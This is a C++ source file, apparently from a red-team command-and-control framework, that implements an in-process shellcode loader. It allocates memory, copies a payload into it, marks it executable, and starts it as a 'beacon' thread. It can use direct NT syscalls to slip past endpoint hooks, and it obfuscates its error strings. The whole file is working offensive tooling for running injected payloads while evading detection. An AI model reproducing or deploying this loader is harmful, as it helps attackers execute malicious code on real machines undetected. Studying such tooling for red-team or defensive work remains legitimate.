#include "StdAfx.h"
#include "InjectionBuffer.h"
#include "DirectSyscalls.h"

namespace FSecure::WinTools
{

	InjectionBuffer::InjectionBuffer(FSecure::ByteView code, BOOL useSyscalls) : m_Size(code.size())
	{
		PVOID address = NULL;
		NTSTATUS res;
		DWORD oldProt;
		BOOL resolved = FALSE;

		if (useSyscalls)
		{
			resolved = resolveApis();

			HANDLE currentProc = GetCurrentProcess();
			res = NtAllocateVirtualMemory(currentProc, &address, 0, (PSIZE_T)&m_Size, MEM_COMMIT, PAGE_READWRITE);

			m_Buffer = decltype(m_Buffer)(address, [](void* buffer) { VirtualFree(buffer, 0, MEM_RELEASE); });
			memcpy_s(m_Buffer.get(), m_Size, code.data(), code.size());

			res = NtProtectVirtualMemory(currentProc, &address, (PSIZE_T)&m_Size, PAGE_EXECUTE_READ, &oldProt);
			
		}
		//Fallback to normal thread execution if direct syscalls failed or was not requested
		if(!useSyscalls || !resolved)
		{
			// Allocate memory as R/W
			auto codePointer = VirtualAlloc(0, m_Size, MEM_COMMIT, PAGE_READWRITE);
			if (!codePointer)
				throw std::runtime_error{ OBF("Couldn't allocate R/W virtual memory: ") + std::to_string(GetLastError()) + OBF(".") };

			m_Buffer = decltype(m_Buffer)(codePointer, [](void* buffer) { VirtualFree(buffer, 0, MEM_RELEASE); });

			// copy the code into buffer
			memcpy_s(m_Buffer.get(), m_Size, code.data(), code.size());

			MarkAsExecutable();
		}

		namespace SEH = FSecure::WinTools::StructuredExceptionHandling;
		// use explicit type to bypass overload resolution
		DWORD(WINAPI * sehWrapper)(SEH::CodePointer) = SEH::SehWrapper;

		if (useSyscalls && resolved)
		{
			NTSTATUS res = NtCreateThreadEx(&m_BeaconThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), reinterpret_cast<LPTHREAD_START_ROUTINE>(sehWrapper), m_Buffer.get(), NULL, 0, 0, 0, NULL);
		}
		else
		{
			// Inject the payload stage into the current process.
			if (m_BeaconThread = CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(sehWrapper), m_Buffer.get(), 0, nullptr); m_BeaconThread == INVALID_HANDLE_VALUE)
				throw std::runtime_error{ OBF("Couldn't run payload: ") + std::to_string(GetLastError()) + OBF(".") };
		}

		FlushInstructionCache(GetCurrentProcess(), m_Buffer.get(), m_Size);
	}

	void InjectionBuffer::MarkAsExecutable() const
	{
		// Mark the memory region R/X
		DWORD prev;
		if (!VirtualProtect(m_Buffer.get(), m_Size, PAGE_EXECUTE_READ, &prev))
			throw std::runtime_error(OBF("Couldn't mark virtual memory as R/X. ") + std::to_string(GetLastError()));
	}


	HANDLE InjectionBuffer::GetThreadHandle()
	{
		return m_BeaconThread;
	}

}

